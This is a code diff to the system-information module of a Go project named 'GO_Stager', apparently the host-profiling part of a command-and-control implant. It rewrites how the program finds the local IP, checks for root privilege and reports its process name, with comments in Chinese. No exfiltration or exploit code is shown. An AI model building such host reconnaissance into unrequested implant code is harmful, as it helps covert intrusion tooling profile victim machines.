@@ -1,13 +1,12 @@
 package sysinfo
 
 import (
-	"io/ioutil"
-	"log"
+	"GO_Stager/util"
 	"math/rand"
 	"net"
 	"os"
+	"os/user"
 	"runtime"
-	"strconv"
 	"strings"
 	"time"
 )
@@ -41,40 +40,75 @@ func GetHeaconID() string {
 }
 
 func GetIPAddr() string {
-	address := "8.8.8.8:65530"
-	timeout := 5 * time.Second
-	conn, err := net.DialTimeout("udp", address, timeout)
+	interfaces, err := net.Interfaces()
 	if err != nil {
-		log.Printf("Failed to connect to %s: %v\n", address, err)
-		return ""
+		util.Println("Error retrieving network interfaces:", err)
+		return "Unable to determine local IP address"
 	}
 
-	localAddr := conn.LocalAddr().(*net.UDPAddr)
-	defer conn.Close()
-	return localAddr.IP.String()
+	for _, iface := range interfaces {
+		// 检查接口是否启用且不是回环接口
+		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
+			addrs, err := iface.Addrs()
+			if err != nil {
+				util.Println("Error retrieving addresses for interface:", iface.Name, err)
+				continue
+			}
+
+			for _, addr := range addrs {
+				var ip net.IP
+				switch v := addr.(type) {
+				case *net.IPNet:
+					ip = v.IP
+				case *net.IPAddr:
+					ip = v.IP
+				}
+
+				// 只获取IPv4地址
+				if ip != nil && ip.To4() != nil {
+					return ip.String()
+				}
+			}
+		}
+	}
+
+	return "no ip"
 }
 
 func GetIntegrity() string {
-	fd, err := os.Open("/root")
-	defer fd.Close()
+	currentUser, err := user.Current()
 	if err != nil {
+		util.Println("Error retrieving current user:", err)
 		return "MEDIUM"
 	}
-	return "HIGH"
+
+	// 检查当前用户是否为 root
+	if currentUser.Username == "root" {
+		return "HIGH"
+	}
+
+	return "MEDIUM"
 }
 
 func GetProcInfo() (int, string) {
-	statPath := "/proc/self/stat"
-	data, err := ioutil.ReadFile(statPath)
+	pid := os.Getpid()
+
+	// 获取当前进程名称
+	exePath, err := os.Executable()
 	if err != nil {
-		log.Printf("Error reading %s: %v\n", statPath, err)
-		return 0, ""
+		util.Printf("Error retrieving executable path: %v\n", err)
+		return pid, ""
 	}
-	fields := strings.Fields(string(data))
-	pid := fields[0]
-	pidInt, _ := strconv.Atoi(pid)
-	pname := strings.Trim(fields[1], "()")
-	return pidInt, pname
+
+	// 获取可执行文件的名称
+	procName := getNameFromPath(exePath)
+
+	return pid, procName
+}
+func getNameFromPath(path string) string {
+	// 提取路径中的文件名部分
+	parts := strings.Split(path, string(os.PathSeparator))
+	return parts[len(parts)-1]
 }
 
 func GetUser() string {
